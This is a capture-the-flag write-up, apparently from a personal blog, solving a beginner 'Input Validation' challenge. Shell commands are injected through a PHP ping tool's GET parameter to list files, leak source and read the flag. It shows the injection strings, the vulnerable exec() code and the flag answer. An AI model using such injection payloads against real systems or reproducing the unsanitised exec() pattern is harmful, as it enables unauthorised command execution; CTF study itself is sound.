Title: RyanCTF Input Validation
Date: 2018-7-27 10:01
Modified: 2018-7-27 10:01
Category: ctf
Tags: ctf
Slug: ryanCTF_inputValidation
Authors: F3real
Summary: How to solve RyanCTF Input Validation

Ryan CTF is nicely organized beginner CTF located at [http://ctf.ryanic.com/](http://ctf.ryanic.com/). Challenges are pretty interesting, with only thing I disliked being that they are played through web shell. So let’s start:

**(Ab)use the ping-tool.html page on the web server [http://ctf.ryanic.com:8080](http://ctf.ryanic.com:8080) to find the flag within the Flag.txt file.**

When we open the site, we see just a simple form asking us for IP we want to ping. Parameters are passed in GET request so if we wanted to ping google DNS our URL would look like

```http://ctf.ryanic.com:8080/ping-tool.php?ip=8.8.8.8```

Now one of basic things (as hinted by challenge name) is to test command injection which we can do by adding ;ls and checking the results:
```
ING 8.8.8.8 (8.8.8.8) 56(84) bytes of data. 
64 bytes from 8.8.8.8: icmp_seq=1 ttl=51 time=1.08 ms 
64 bytes from 8.8.8.8: icmp_seq=2 ttl=51 time=0.493 ms 
64 bytes from 8.8.8.8: icmp_seq=3 ttl=51 time=0.399 ms 
64 bytes from 8.8.8.8: icmp_seq=4 ttl=51 time=0.418 ms 
 
--- 8.8.8.8 ping statistics --- 
4 packets transmitted, 4 received, 0% packet loss, time 3042ms 
rtt min/avg/max/mdev = 0.399/0.598/1.085/0.284 ms 
index.php 
logo.png 
ping-tool.html 
ping-tool.php 
secret.html 
test.txt 
x.txt
```

Now for fun we can also leak the code of this .php script running on the server with

```http://ctf.ryanic.com:8080/ping-tool.php?ip=8.8.8.8;cat+ping-tool.php```

Here it is just important to note that we need to URL encode parameters so for example in case above `space` is replaced by `+` .

And we get:
~~~php
<?
$out = array();
exec("ping -c 4 " . $_GET["ip"], $out);
foreach($out as $line) {
echo "$line
";
}
?> 
~~~

Now for remaining part, we need to find flag. We can do this just trough browser but also we can do it through **burp**, to make it easier and it is good tool to know.

We need to capture one of request we send to server and forward it to repeater, in this way we can quickly modify parameters of request and URL encode them. For this we just need to start burp, turn the intercept on and set browser to use proxy (in case of burp `localhost` on the port `8080` by default).

First I tried running find for flag, which failed for some reason so I decided to simply check directories bellow our current one.

![ping ls]({static}/images/2018_7_27_Ping.png){: .img-fluid .centerimage}


Parameters of request if URL decoded are simply `;cd..;ls`. And it seems we were in luck since Flag.txt is just one sub-directory bellow. We simply `cat Flag.txt` and that’s it.

`Flag: pluripresence`